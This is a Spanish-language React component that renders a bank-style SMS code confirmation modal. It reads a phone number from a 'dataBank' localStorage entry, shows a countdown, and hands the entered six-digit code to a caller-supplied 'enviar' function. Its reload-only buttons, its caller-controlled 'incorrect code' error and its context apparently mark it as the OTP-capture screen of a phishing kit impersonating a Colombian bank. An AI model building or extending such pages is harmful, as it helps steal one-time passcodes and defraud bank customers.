/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { useEffect, useState, useRef } from "react";

export default function Otp({ enviar, isError = false }: { enviar: any; isError?: boolean }) {
  const [values, setValues] = useState(["", "", "", "", "", ""]);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutos
  const [phone, setPhone] = useState(" ");
  const [focusedIndex, setFocusedIndex] = useState<number | null>(null);
  const inputs = Array.from({ length: 6 }).map(() => useRef<HTMLInputElement>(null));

  useEffect(() => {
    try {
      const data = localStorage.getItem("dataBank");
      if (data) {
        const parsed = JSON.parse(data);
        if (parsed.phone) {
          setPhone(`+57 ${parsed.phone}`);
        }
      }
    } catch (e) {}
  }, []);

  // Temporizador
  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  // Formatear tiempo MM:SS
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  // Anillo SVG circular
  const radius = 50;
  const stroke = 4;
  const normalizedRadius = radius - stroke * 2;
  const circumference = normalizedRadius * 2 * Math.PI;
  const strokeDashoffset = circumference - (timeLeft / 300) * circumference;

  const handleChange = (index: number, val: string) => {
    if (!/^[0-9]?$/.test(val)) return;

    const newValues = [...values];
    newValues[index] = val;
    setValues(newValues);

    if (val && index < 5) {
      inputs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !values[index] && index > 0) {
      inputs[index - 1].current?.focus();
    }
  };

  const isComplete = values.every((v) => v !== "");

  const handleConfirm = () => {
    if (!isComplete) return;
    enviar?.({ otp: values.join(""), view: "otp" });
  };

  return (
    <div style={{
      position: "fixed",
      top: 0,
      left: 0,
      width: "100vw",
      height: "100vh",
      backgroundColor: "rgba(0, 0, 0, 0.5)",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      padding: "20px",
      zIndex: 99999,
      fontFamily: "'Manrope', sans-serif",
      boxSizing: "border-box"
    }}>
      
      {/* Tarjeta Modal */}
      <div style={{
        backgroundColor: "#ffffff",
        borderRadius: "24px",
        padding: "32px 24px",
        maxWidth: "400px",
        width: "100%",
        textAlign: "center",
        position: "relative",
        boxShadow: "0 10px 25px rgba(0,0,0,0.2)",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        boxSizing: "border-box"
      }}>
        
        {/* Botón de Cerrar (X) */}
        <button
          onClick={() => window.location.reload()}
          style={{
            position: "absolute",
            top: "12px",
            right: "16px",
            background: "none",
            border: "none",
            fontSize: "22px",
            color: "#999",
            cursor: "pointer",
            lineHeight: 1,
            padding: 0
          }}
        >
          ✕
        </button>

        {/* Título */}
        <h2 style={{
          fontSize: "22px",
          fontWeight: "bold",
          color: "#2C2A29",
          margin: "10px 0 8px 0",
          lineHeight: "1.2"
        }}>
          Confirma tus datos
        </h2>

        {/* Subtítulo */}
        <p style={{
          fontSize: "13px",
          color: "#666666",
          margin: "0 0 24px 0",
          maxWidth: "280px",
          lineHeight: "1.4"
        }}>
          Ingresa el código que te enviamos por mensaje de texto.
        </p>

        {/* Mensaje de Error (si aplica) */}
        {isError && (
          <div style={{
            fontSize: "12px",
            fontWeight: "bold",
            color: "#E02B2B",
            backgroundColor: "#FEECEC",
            padding: "8px 16px",
            borderRadius: "8px",
            marginBottom: "16px",
            width: "100%",
            boxSizing: "border-box"
          }}>
            El código ingresado es incorrecto. Por favor verifícalo.
          </div>
        )}

        {/* Animación del Anillo Temporizador */}
        <div style={{
          position: "relative",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          width: "110px",
          height: "110px",
          marginBottom: "28px"
        }}>
          <svg style={{
            width: "100%",
            height: "100%",
            transform: "rotate(-90deg)"
          }}>
            {/* Círculo de Fondo */}
            <circle
              stroke="#E5E7EB"
              strokeWidth={stroke}
              fill="transparent"
              r={normalizedRadius}
              cx={55}
              cy={55}
            />
            {/* Círculo de Progreso */}
            <circle
              stroke="#00C389"
              strokeWidth={stroke}
              strokeDasharray={circumference + " " + circumference}
              style={{ strokeDashoffset, transition: "stroke-dashoffset 1s linear" }}
              strokeLinecap="round"
              fill="transparent"
              r={normalizedRadius}
              cx={55}
              cy={55}
            />
          </svg>

          {/* Textos dentro del círculo */}
          <div style={{
            position: "absolute",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "center"
          }}>
            <span style={{ fontSize: "10px", color: "#999999" }}>Vencerá en:</span>
            <span style={{ fontSize: "18px", fontWeight: "bold", color: "#2C2A29", marginTop: "2px" }}>
              {formatTime(timeLeft)}
            </span>
          </div>
        </div>

        {/* Inputs de Código OTP */}
        <div style={{
          display: "flex",
          justifyContent: "center",
          gap: "10px",
          marginBottom: "24px"
        }}>
          {values.map((val, i) => (
            <input
              key={i}
              ref={inputs[i]}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={val}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              onFocus={() => setFocusedIndex(i)}
              onBlur={() => setFocusedIndex(null)}
              style={{
                width: "32px",
                height: "40px",
                border: "none",
                borderBottom: isError 
                  ? "2px solid #E02B2B" 
                  : (focusedIndex === i ? "2px solid #00C389" : "2px solid #D1D5DB"),
                textAlign: "center",
                fontSize: "20px",
                fontWeight: "bold",
                color: isError ? "#E02B2B" : "#2C2A29",
                backgroundColor: "transparent",
                outline: "none",
                padding: 0,
                margin: 0
              }}
            />
          ))}
        </div>

        {/* Información del Teléfono */}
        <div style={{
          fontSize: "12px",
          color: "#999999",
          marginBottom: "28px",
          lineHeight: "1.4"
        }}>
          Búscalo en el número <br />
          <span style={{ fontSize: "13px", fontWeight: "bold", color: "#2C2A29" }}>{phone}</span>
        </div>

        {/* Botones de Acción */}
        <div style={{
          display: "flex",
          justifyContent: "space-between",
          width: "100%",
          gap: "12px"
        }}>
          <button
            type="button"
            onClick={() => window.location.reload()}
            style={{
              width: "48%",
              height: "44px",
              border: "1px solid #ccc",
              borderRadius: "22px",
              backgroundColor: "#ffffff",
              color: "#333333",
              fontWeight: "bold",
              fontSize: "14px",
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              boxSizing: "border-box",
              padding: 0
            }}
          >
            Volver
          </button>
          
          <button
            type="button"
            disabled={!isComplete}
            onClick={handleConfirm}
            style={{
              width: "48%",
              height: "44px",
              border: "none",
              borderRadius: "22px",
              backgroundColor: isComplete ? "#FDDA24" : "#E5E7EB",
              color: isComplete ? "#2C2A29" : "#A3A3A3",
              fontWeight: "bold",
              fontSize: "14px",
              cursor: isComplete ? "pointer" : "not-allowed",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              boxSizing: "border-box",
              padding: 0
            }}
          >
            Confirmar
          </button>
        </div>

      </div>
    </div>
  );
}